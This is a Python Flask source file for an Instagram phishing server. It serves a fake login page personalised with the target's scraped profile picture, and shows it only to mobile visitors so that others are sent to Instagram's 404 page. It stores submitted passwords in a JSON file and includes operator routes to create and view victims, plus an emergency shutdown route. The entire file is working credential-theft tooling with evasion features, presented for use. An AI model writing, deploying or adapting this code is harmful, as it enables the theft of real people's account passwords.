from flask import Flask, request, redirect, render_template
from os.path import exists
from datetime import datetime
from json import loads, dumps
from bs4 import BeautifulSoup
import requests
import os

app = Flask(__name__)

if not exists('password.txt'):
    with open('password.txt', 'w') as file:
        file.write("password")

if not exists('database.json'):
    with open('database.json', 'w') as file:
        file.write("{}")

def get_pfp(username):
    base_url = f"https://www.instagram.com/{username}/"
    
    response = requests.get(base_url)

    pfp = "https://upload.wikimedia.org/wikipedia/commons/a/ac/Default_pfp.jpg"
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        meta_tag = soup.find("meta", property="og:image")
        
        if meta_tag:
            pfp = meta_tag["content"]
        
    return pfp

@app.errorhandler(404)
def page_not_found(e):
    return redirect('https://www.instagram.com/404')

@app.route('/')
def index():
    return redirect('https://www.instagram.com')

@app.route('/<backend>')
def login(backend):
    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend not in data:
        return redirect('https://www.instagram.com/404') 
    
    if data[backend]["done"]:
        return redirect(data[backend]["url"])
    
    user_agent = request.headers.get('User-Agent')
    
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
        username = data[backend]["username"]

        pfp = get_pfp(username)
        
        return render_template("login.html", username=username, pfp=pfp, backend=backend)
        
    return redirect('https://www.instagram.com/404')   

@app.route('/<backend>/submit', methods=['POST'])
def submit(backend):
    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend not in data:
        return redirect('https://www.instagram.com/404')  

    data[backend]["password"] = request.form.get('password')
    data[backend]["submit_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open('database.json', 'w') as file:
        file.write(
            dumps(
                data,
                indent=4
            )
        )

    url = data[backend]["url"]

    return redirect(url)
    
@app.route('/<password>/create')
def create(password):
    with open("password.txt", "r") as file:
        original_password = file.read()

    if password != original_password:
        return redirect("https://www.instagram.com/404")
    
    return render_template("create.html", url=request.url_root)

@app.route('/<password>/create/submit', methods=["POST"])
def create_new(password):
    with open("password.txt", "r") as file:
        original_password = file.read()

    if password != original_password:
        return redirect("https://www.instagram.com/404")
    
    data = request.form

    username = data.get('username')
    url = "https://www.instagram.com/" + data.get('url').removeprefix("https://www.instagram.com").removeprefix("/")
    backend = data.get('backend')

    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend in data:
        return "<h1>Backend already in use. Please choose another one.<h1/>" 
    
    data[backend] = {}
    
    data[backend]["create_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data[backend]["username"] = username
    data[backend]["url"] = url
    data[backend]["done"] = False

    with open('database.json', 'w') as file:
        file.write(
            dumps(
                data,
                indent=4
            )
        )

    url = data[backend]["url"]

    return redirect(url)
    
@app.route('/<password>/<backend>/view')
def view(password, backend):
    with open("password.txt", "r") as file:
        original_password = file.read()

    if password != original_password:
        return redirect("https://www.instagram.com/404")
    
    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend not in data:
        return redirect('https://www.instagram.com/404')  
    

    url = request.root_url + backend
    data = data[backend]
    pfp = get_pfp(data["username"])
    
    return render_template("view.html", url=url, data=data, pfp=pfp)

@app.route('/<password>/<backend>/update', methods=["POST"])
def update(password, backend):
    with open("password.txt", "r") as file:
        original_password = file.read()

    if password != original_password:
        return redirect("https://www.instagram.com/404")
    
    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend not in data:
        return redirect('https://www.instagram.com/404')  
    
    url = request.json["url"]
    done = request.json["done"]
    
    data[backend]["url"] = url
    data[backend]["done"] = done

    with open('database.json', 'w') as file:
        file.write(
            dumps(
                data,
                indent=4
            )
        )

    return "", 200

@app.route('/<password>/<backend>/delete')
def delete(password, backend):
    with open("password.txt", "r") as file:
        original_password = file.read()

    if password != original_password:
        return redirect("https://www.instagram.com/404")
    
    with open('database.json', 'r') as file:
        data = loads(
            file.read()
        )

    if backend not in data:
        return redirect('https://www.instagram.com/404')  
    
    data.pop(backend)

    with open('database.json', 'w') as file:
        file.write(
            dumps(
                data,
                indent=4
            )
        )

    return "", 200

@app.route('/mayday')
def mayday():
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("mayday.txt", "w") as file:
        file.write(f"{date} - {request.remote_addr}")

    print(f"{date} - MAYDAY !!! - {request.remote_addr}")

    os._exit(0)

if __name__ == '__main__':
    app.run()
